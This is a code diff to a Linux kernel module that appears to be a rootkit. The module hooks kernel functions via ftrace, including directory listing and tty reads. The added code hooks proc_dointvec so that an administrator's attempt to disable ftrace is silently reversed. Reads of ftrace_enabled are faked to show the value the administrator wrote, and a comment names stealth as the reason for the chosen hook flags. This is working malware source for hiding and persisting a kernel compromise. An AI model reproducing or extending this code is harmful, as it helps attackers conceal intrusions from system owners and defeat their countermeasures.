@@ -212,6 +212,53 @@ out:
     return rv;
 }
 
+static inline bool _ftrace_intercept_init(bool set) {
+    static bool _intercept_init;
+    if (set && _intercept_init == false)
+        _intercept_init = true;
+    return _intercept_init;
+}
+
+static char kv_prev_ftrace_enabled[16] = "1\n";
+static bool _ftrace_intercept(struct pt_regs *regs) {
+    const char __user *arg;
+    struct file *file;
+    struct path file_path;
+    bool rc = false;
+
+    int fd = PT_REGS_PARM1(regs);
+    if (!fd) goto out;
+
+    file = fget(fd);
+    if (!file) goto out;
+
+    /** XXX: check this lock against race */
+    spin_lock(&file->f_lock);
+    file_path = file->f_path;
+    spin_unlock(&file->f_lock);
+    fput(file);
+
+    if (file_path.dentry && file_path.dentry->d_name.name) {
+        if (strstr(file_path.dentry->d_name.name, "ftrace_enabled") &&
+                _ftrace_intercept_init(false)) {
+            char current_value[16+1] = {0};
+            char output[] = "1\n";
+
+            arg = (const char __user *)PT_REGS_PARM2(regs);
+            if (copy_from_user(current_value, (void *)arg, 16))
+                goto out;
+
+            current_value[sizeof(current_value) - 1] = '\0';
+            strncpy(output, kv_prev_ftrace_enabled, sizeof(output));
+            size_t output_size = sizeof(output) - 1;
+
+            if (!copy_to_user((void*)arg, output, output_size))
+                rc = true;
+        }
+    }
+out:
+    return rc;
+}
 
 static asmlinkage long m_read(struct pt_regs *regs) {
     char *buf = NULL;
@@ -223,6 +270,9 @@ static asmlinkage long m_read(struct pt_regs *regs) {
 
     /** call the real thing first */
     rv = real_m_read(regs);
+
+    if (_ftrace_intercept(regs))
+        goto out;
 
     fs = fs_get_file_node(current);
     if (!fs || !fs->filename)
@@ -239,7 +289,7 @@ static asmlinkage long m_read(struct pt_regs *regs) {
         goto out;
 
     size = PT_REGS_PARM3(regs);
-    if (!(buf = (char *)kmalloc(size, GFP_KERNEL)))
+    if (!(buf = (char *)kzalloc(size+1, GFP_KERNEL)))
         goto out;
 
     arg = (const char __user*)PT_REGS_PARM2(regs);
@@ -875,6 +925,35 @@ out:
     return rv;
 }
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,8,0)
+static int (*real_proc_dointvec)(struct ctl_table *, int,
+        void __user*, size_t *, loff_t *);
+static int m_proc_dointvec(struct ctl_table *table, int write,
+        void __user *buffer, size_t *lenp, loff_t *ppos)
+#else
+static int (*real_proc_dointvec)(struct ctl_table *, int,
+        void *, size_t *, loff_t *);
+static int m_proc_dointvec(struct ctl_table *table, int write,
+        void *buffer, size_t *lenp, loff_t *ppos)
+#endif
+{
+    int rc = real_proc_dointvec(table, write, buffer, lenp, ppos);
+    if (write) {
+        int val = *(int *)(table->data);
+
+        (void)_ftrace_intercept_init(true);
+
+        if (val == 0) {
+            *(int *)(table->data) = 1;
+            snprintf(kv_prev_ftrace_enabled, sizeof(kv_prev_ftrace_enabled), "%d\n", val);
+        } else {
+            snprintf(kv_prev_ftrace_enabled, sizeof(kv_prev_ftrace_enabled), "%d\n", val);
+        }
+
+    }
+    return rc;
+}
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
 #define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
 #endif
@@ -1048,6 +1127,7 @@ static struct ftrace_hook ft_hooks[] = {
     {"filldir", m_filldir, &real_filldir},
     {"filldir64", m_filldir64, &real_filldir64},
     {"tty_read", m_tty_read, &real_tty_read},
+    {"proc_dointvec", m_proc_dointvec, &real_proc_dointvec},
     {NULL, NULL, NULL},
 };
 
@@ -1058,7 +1138,12 @@ int fh_install_hook(struct ftrace_hook *hook) {
         return err;
 
     hook->ops.func = fh_ftrace_thunk;
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS|FTRACE_OPS_FL_RECURSION|FTRACE_OPS_FL_IPMODIFY;
+
+    /** Note: For kernels >= v5.5 there is FTRACE_OPS_FL_PERMANENT
+     *  but then we'd not be stealth.
+     */
+  hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS|FTRACE_OPS_FL_RECURSION|
+      FTRACE_OPS_FL_IPMODIFY;
 
     if ((err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0))) {
         prerr("ftrace_set_filter_ip() failed: %d\n", err);
